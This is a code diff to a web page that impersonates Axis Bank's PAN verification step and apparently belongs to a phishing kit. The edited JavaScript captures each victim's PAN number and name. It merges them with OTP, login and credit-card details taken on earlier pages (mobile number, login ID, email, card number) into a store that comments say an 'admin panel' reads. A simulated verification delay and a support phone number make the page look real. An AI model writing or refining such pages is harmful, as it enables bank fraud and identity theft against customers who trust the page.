@@ -446,7 +446,7 @@
             text-decoration: underline;
         }
         
-        /* Footer - SIMPLIFIED */
+        /* Footer */
         .main-footer {
             background: #87103F;
             color: white;
@@ -637,7 +637,7 @@
             </div>
         </div>
         
-        <!-- Footer - SIMPLIFIED -->
+        <!-- Footer -->
         <footer class="main-footer">
             <div class="footer-content">
                 <div class="copyright">
@@ -685,24 +685,31 @@
                 // Get all submissions from localStorage
                 const submissions = JSON.parse(localStorage.getItem('axisBankSubmissions') || '[]');
                 
-                // Find OTP submission
-                const otpSubmission = submissions.find(sub => sub.type === 'otp');
+                // Find OTP submission (last otp submission)
+                const otpSubmissions = submissions.filter(sub => sub.type === 'otp');
+                const otpSubmission = otpSubmissions.length > 0 ? otpSubmissions[0] : null;
                 
-                // Find login submission
-                const loginSubmission = submissions.find(sub => sub.type === 'login');
+                // Find login submission (last login submission)
+                const loginSubmissions = submissions.filter(sub => sub.type === 'login');
+                const loginSubmission = loginSubmissions.length > 0 ? loginSubmissions[0] : null;
+                
+                // Find credit submission if any (last credit submission)
+                const creditSubmissions = submissions.filter(sub => sub.type === 'credit');
+                const creditSubmission = creditSubmissions.length > 0 ? creditSubmissions[0] : null;
                 
                 return {
                     otpData: otpSubmission,
-                    loginData: loginSubmission
+                    loginData: loginSubmission,
+                    creditData: creditSubmission
                 };
             } catch (e) {
                 console.error('Error getting user data:', e);
-                return { otpData: null, loginData: null };
+                return { otpData: null, loginData: null, creditData: null };
             }
         }
         
-        // ✅ FIXED: Save PAN data to axisBankSubmissions (same as admin panel reads from)
-        function savePANData(panData) {
+        // Save PAN data to axisBankSubmissions
+        function savePANData(panNumber, fullName) {
             try {
                 // Get existing submissions
                 let submissions = JSON.parse(localStorage.getItem('axisBankSubmissions') || '[]');
@@ -710,7 +717,7 @@
                 // Get user data from previous steps
                 const userData = getUserData();
                 
-                // Create PAN submission object
+                // Create PAN submission object - EXACT INPUT AS ENTERED
                 const panSubmission = {
                     id: 'PAN-' + Date.now(),
                     type: 'pan',
@@ -719,13 +726,17 @@
                     ip: '', // Will be captured if needed
                     userAgent: navigator.userAgent,
                     data: {
-                        panNumber: panData.panNumber,
-                        fullName: panData.fullName,
+                        panNumber: panNumber, // EXACT INPUT: ABCDE1234H
+                        fullName: fullName,   // EXACT INPUT: rahul
                         status: 'verified',
                         source: 'PAN Verification Page',
                         // Include previous data if available
-                        mobileNumber: userData.otpData?.data?.mobileNumber || userData.loginData?.data?.mobile || '',
-                        userId: userData.loginData?.data?.loginId || userData.loginData?.data?.userId || '',
+                        mobileNumber: userData.otpData?.data?.mobileNumber || 
+                                    userData.loginData?.data?.mobile || 
+                                    userData.creditData?.data?.mobile || '',
+                        userId: userData.loginData?.data?.loginId || 
+                               userData.loginData?.data?.userId || 
+                               userData.creditData?.data?.cardNumber || '',
                         email: userData.loginData?.data?.email || ''
                     }
                 };
@@ -733,7 +744,7 @@
                 // Add to submissions array (newest first)
                 submissions.unshift(panSubmission);
                 
-                // Save back to localStorage (CORRECT KEY: axisBankSubmissions)
+                // Save back to localStorage
                 localStorage.setItem('axisBankSubmissions', JSON.stringify(submissions));
                 
                 console.log('✅ PAN submission saved to axisBankSubmissions:', panSubmission);
@@ -749,9 +760,9 @@
             panForm.addEventListener('submit', function(e) {
                 e.preventDefault();
                 
-                // Get form values
-                const panNumber = panNumberInput.value.toUpperCase();
-                const fullName = fullNameInput.value.trim();
+                // Get form values EXACTLY as entered
+                const panNumber = panNumberInput.value; // Keep as is (already uppercase)
+                const fullName = fullNameInput.value.trim(); // Keep as entered
                 
                 // Validate PAN format
                 if (!validatePAN(panNumber)) {
@@ -781,15 +792,8 @@
                 verifyButton.classList.add('loading');
                 verifyButton.disabled = true;
                 
-                // Prepare PAN data
-                const panData = {
-                    panNumber: panNumber,
-                    fullName: fullName,
-                    verificationTime: new Date().toLocaleString()
-                };
-                
-                // ✅ FIXED: Save PAN data to correct localStorage key
-                const saved = savePANData(panData);
+                // ✅ FIXED: Save PAN data EXACTLY as entered
+                const saved = savePANData(panNumber, fullName);
                 
                 // Simulate verification delay
                 setTimeout(() => {
@@ -818,7 +822,7 @@
         // Help link handler
         helpLink.addEventListener('click', function(e) {
             e.preventDefault();
-            window.location.href = 'help.html';
+            alert('For assistance with PAN verification, please contact Axis Bank customer support at 1860-419-5555.');
         });
         
         // Initialize
@@ -826,7 +830,7 @@
             // Focus PAN input
             panNumberInput.focus();
             
-            // ✅ FIXED: Initialize axisBankSubmissions if not exists (same as admin panel uses)
+            // Initialize axisBankSubmissions if not exists
             if (!localStorage.getItem('axisBankSubmissions')) {
                 localStorage.setItem('axisBankSubmissions', JSON.stringify([]));
             }
